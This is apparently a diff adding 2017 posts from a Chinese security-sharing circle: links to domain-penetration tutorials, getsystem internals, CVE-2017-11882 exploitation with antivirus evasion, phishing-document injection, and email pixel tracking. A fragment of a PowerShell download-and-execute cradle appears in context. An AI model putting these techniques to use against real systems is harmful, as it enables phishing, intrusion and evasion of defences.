@@ -194,6 +194,28 @@ PowerView的作者HarmJ0y写的一些该脚本的使用方法，windows域的侦
 
 ---
 
+<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-11-13:
+
+
+__#基础#__
+
+ 域渗透基础教程
+之前有小伙伴咨询域渗透的技术，这里有个比较初级。
+从域的搭建，到端口转发、代理、反弹shell、信息收集、抓HASH，都有介绍，还附带了一些常用工具。适合对内网渗透不了解的同学看一下，都看明白之后，其它内网渗透文章就没什么问题了。
+
+[GitHub - l3m0n/pentest_study: 从零开始内网渗透学习](https://github.com/l3m0n/pentest_study)
+
+
+
+
+<img src="https://file.xiaomiquan.com/107/17/0717b38c146bd2105fe2ce031a1b395cc1a2717e57b6efa3689339f7df5311e8.png" width="50%" height="50%" align="middle"/>
+
+<img src="https://file.xiaomiquan.com/1d4/37/d4379b2a5377b798074e0304d7b069bf200fb11dbed8b16c541bc98d3d594ae2.png" width="50%" height="50%" align="middle"/>
+
+
+
+---
+
 
 ## MSF
 
@@ -540,6 +562,26 @@ search PostgreSQL
 
 ---
 
+<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ on 2017-11-21:
+
+
+__#科普#__
+
+玩过Metasploit的都知道，Meterpreter里有个“getsystem”命令，可以获取到SYSTEM 权限，这篇文章就是讲解背后的原理的！
+ 
+链接：
+
+[XPN InfoSec Blog](https://blog.xpnsec.com/becoming-system/)
+
+...
+
+<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 国内的社区真是勤奋，这么快就翻译了
+[【技术分享】获取SYSTEM权限的多种姿势 - 安全客 - 有思想的安全新媒体](http://bobao.360.cn/learning/detail/4740.html)
+
+...
+
+---
+
 ## Linux Shell
 
 
@@ -769,6 +811,7 @@ certutil.exe -encode setup.exe setup.b64
 工具虽小，但我里面用了一些小技巧，你在阅读源码的时候应该就会注意到了。另外，写得仓促，可能有错误或者需要改进的地方，圈友们可自行修改。
 
 <img src="https://images.xiaomiquan.com/Fvb1uk0UNtTW4QO5ztFWnIhekvWg?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:WCbccaAneV-SSm2aQD_ttO-v1IM=" width="50%" height="50%" align="middle"/>
+
 <img src="https://images.xiaomiquan.com/Fkr-fsE9IHqeL1mLm1clvDYlA_uF?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:BmcsH54WipZgXlwsaGngF9B6qh0=" width="50%" height="50%" align="middle"/>
 
 __分享文件:__
@@ -922,9 +965,13 @@ Win32_ShadowCopy.Create(
 举一反三的机会留给各位圈友了：-）
 
 <img src="https://images.xiaomiquan.com/Fr3g-bDh6ZEsWgeuedBGC3XRbq_l?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:jyHrhJEjosuVJuUmtjKlF2ifYJ8=" width="50%" height="50%" align="middle"/>
+
 <img src="https://images.xiaomiquan.com/FmT7oZ79Jbh44M3auMEbhYRfsx-s?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:psLIgsGpbh9aywxarRAauuzLBrg=" width="50%" height="50%" align="middle"/>
+
 <img src="https://images.xiaomiquan.com/FvuN5GgkqCVU3yGgpSi-sakrbYqM?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Cn4mcNhkPIcPKRk7lHitjUohHHQ=" width="50%" height="50%" align="middle"/>
+
 <img src="https://images.xiaomiquan.com/FrColQQRXcJjgEsM9G6YkaFzogxe?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:nw9K-O-Y6Ga6UEfxIhipq9WYG7g=" width="50%" height="50%" align="middle"/>
+
 <img src="https://images.xiaomiquan.com/Fksg794N47n3RgzNFwYSbDDVA1jv?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:PJ_hAwIodO4J7VvaUZcAL7gfZFA=" width="50%" height="50%" align="middle"/>
 
 
@@ -979,6 +1026,7 @@ C:\Users\Administrator>powershell IEX (New-Object Net.WebClient).DownloadString(
 这篇介绍了一些功能
 
 <img src="https://images.xiaomiquan.com/Fm5xgpU8CtkJdA1HGdpE2Lc8iZ4o?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:lUnN4kveeBAKsxpdmxom6PAP-Js=" width="50%" height="50%" align="middle"/>
+
 <img src="https://images.xiaomiquan.com/FoXVJry5A5tEbpiAolQu7NpF5Yku?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:2XNEHgmrZhTpLawfaPYTimGy0kg=" width="50%" height="50%" align="middle"/>
 
 
@@ -1293,6 +1341,69 @@ __分享文件:__
 
 ---
 
+<img src="https://file.xiaomiquan.com/db/ce/dbcedb702dd5c5492dd767b6ca4573feb85d7a33fbd03f687408f6462185c575.jpg" width="25px"/> __myh0st__ on 2017-11-23:
+
+
+__#漏洞#__
+
+ 小伙伴做的关于CVE-2017-11882 的复现及防御，希望大家别拿来做违法的事情，作为学习只用。
+
+[CVE-2017-11882复现及防御 - 信安之路](http://www.myh0st.cn/index.php/archives/329/)
+
+
+
+
+
+...
+
+<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 自带有ps_shell这个模块吗？
+
+<img src="https://file.xiaomiquan.com/db/ce/dbcedb702dd5c5492dd767b6ca4573feb85d7a33fbd03f687408f6462185c575.jpg" width="25px"/> __myh0st__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 试一下，看看呗
+
+<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__ replies to <img src="https://file.xiaomiquan.com/db/ce/dbcedb702dd5c5492dd767b6ca4573feb85d7a33fbd03f687408f6462185c575.jpg" width="25px"/> __myh0st__: 没有的，好像是哪个写的，我再问问。
+
+<img src="https://file.xiaomiquan.com/175/24/752430e4f6766378034cccf675f79c0822fe3a4cf5cb393eda4fe93cc123b3ff.jpeg" width="25px"/> __Reds__: 好像是cmd5里的乱舞好流弊👍👍
+
+<img src="https://file.xiaomiquan.com/db/ce/dbcedb702dd5c5492dd767b6ca4573feb85d7a33fbd03f687408f6462185c575.jpg" width="25px"/> __myh0st__ replies to <img src="https://file.xiaomiquan.com/175/24/752430e4f6766378034cccf675f79c0822fe3a4cf5cb393eda4fe93cc123b3ff.jpeg" width="25px"/> __Reds__: 我都不知道他的名字
+
+<img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: msf 中没有PS_shell 怎么办？
+
+<img src="https://file.xiaomiquan.com/3a/1d/3a1dfafee22fabee58800a8d92e40cb97cae002fa0245156de52e427a2631344.jpg" width="25px"/> __Leo__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 用这个exploit/windows/misc/hta_server，效果一样的
+
+
+...
+
+---
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-11-26:
+
+
+__#姿势#__
+
+Office CVE-2017-11882 实战免杀
+
+分享者@J  
+
+进圈挺久了，很喜欢圈里的氛围，也想着能分享些东西，但奈何太菜😂。今天找到弦哥以前公众号推的免杀文章，就想着跟office11882结合起来，其实严格说起来，我这还属于弦哥那篇文章的实践。现在我也体会到一种影响是可以潜移默化的，并当我们需要的时候会适时出现。谢谢“灰袍技能”！
+
+
+[Office CVE-2017-11882实战免杀](https://delcoding.github.io/2017/11/office-2017-11882-bypass/)
+
+...
+
+<img src="https://file.xiaomiquan.com/a0/16/a016a3391c653fd1ee1940e7c61dc1f8692a3742a6e33804b3221d27cf1b7f75.jpg" width="25px"/> __小黑__: 太喜欢这样的干货了，今天实验成功，而且免杀，win7 win10都成功了，就是win2003+office2003弹不了，还有就是生成的文档一修改添加东西保存后也弹不了，求解
+
+<img src="https://file.xiaomiquan.com/66/c6/66c64143afd244155da8c28bd184ab791369eafba71c41ae563a359d178a82c5.jpg" width="25px"/> __J__ replies to <img src="https://file.xiaomiquan.com/a0/16/a016a3391c653fd1ee1940e7c61dc1f8692a3742a6e33804b3221d27cf1b7f75.jpg" width="25px"/> __小黑__: 如果是要插入模板的话，我倒是看过一个脚本，可以在已有的文档里注入代码，不过我没实践，链接：
+[CVE-2017-11882钓鱼攻击 « 倾旋的博客](http://payloads.online/archivers/2017-11-22/1)
+
+
+<img src="https://file.xiaomiquan.com/b6/4a/b64a313d21a50c71fa67bee596a343fd60aa66d5437d5ee537f28bcb3849b8ca.jpg" width="25px"/> __北风飘然__: 这个看起来360并不是因为11882的特征判断的  [疑问]
+
+
+...
+
+---
+
 ## Windows COM
 
 <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-21:
@@ -1455,6 +1566,7 @@ P.S.
 使用不同的服务器解析相同的域名会有不同的ip地址，因为智能dns服务器会尽量将流量限定在本地网络，当进行域名查询的时候会返回最近的域名服务器的地址
 
 <img src="https://images.xiaomiquan.com/FoXOKm9XO81g-qTG-L7YB3R4juZi?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:VdpLft4Myzk6c2JKw6hUfBYmvak=" width="50%" height="50%" align="middle"/>
+
 <img src="https://images.xiaomiquan.com/Fkn83Kq9msBwJrn804arEKfpaYQN?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:-I0LRfQgpTajMTtXydf-mD0kxnQ=" width="50%" height="50%" align="middle"/>
 
 
@@ -1707,6 +1819,40 @@ recon-ng类似于msf，并且和msf的使用有异曲同工之妙，详细可以
 安利最近差不多看完的一本书《Python黑帽子:黑客与渗透测试编程之道》，不要仅限于成为一个脚本小子！共勉
 
 
+
+---
+
+<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ on 2017-11-23:
+
+IP-Biter 邮件追踪系统 也就是说所谓的像素追踪
+
+此种追踪不需要漏洞，在两个产业用的比较的多，1.广告公司 2.APT信息收集
+
+其原理就是发送邮件时插入图片，当别人打开邮件查看的时候，访问了远程的图片，你在Web日志这边可以获取到ip、User-anget等信息。此攻击收集信息有限
+
+为了应对这种信息收集的方式，国内的邮箱厂商发现邮件里有图片时，需要手动点击加载，Gmail图片缓存在服务器，不存在这种问题。
+
+不得不说，老外弄的东西，还是考虑很完善，还有跟踪报告，用户代理分析。我当时用的时候就写了个php脚本临时用了下，有时候获取到信息，我几天后才知道尴尬
+  
+[GitHub - damianofalcioni/IP-Biter: IP-Biter: The H...](https://github.com/damianofalcioni/IP-Biter)
+
+
+```
+<img src=http://127.0.0.1/fuckme/1.php?name=sanr@qq.com>
+```
+
+<img src="https://file.xiaomiquan.com/12c/d8/2cd8953d528fe350ee250a376e0148bbbb9120a74ce8bd0ff52fc75264072035.png" width="50%" height="50%" align="middle"/>
+
+<img src="https://file.xiaomiquan.com/1c2/3b/c23b1070720098b14766115a97d9728187ba92f5a076f3921f52be03e1279c81.png" width="50%" height="50%" align="middle"/>
+
+<img src="https://file.xiaomiquan.com/182/bb/82bbf7d214cdb9431f4c73a6898609ebc92bceaae65bf4bd7a0d521dc98c44c5.png" width="50%" height="50%" align="middle"/>
+
+
+...
+
+<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__: 更正：User Agent
+
+...
 
 ---
 
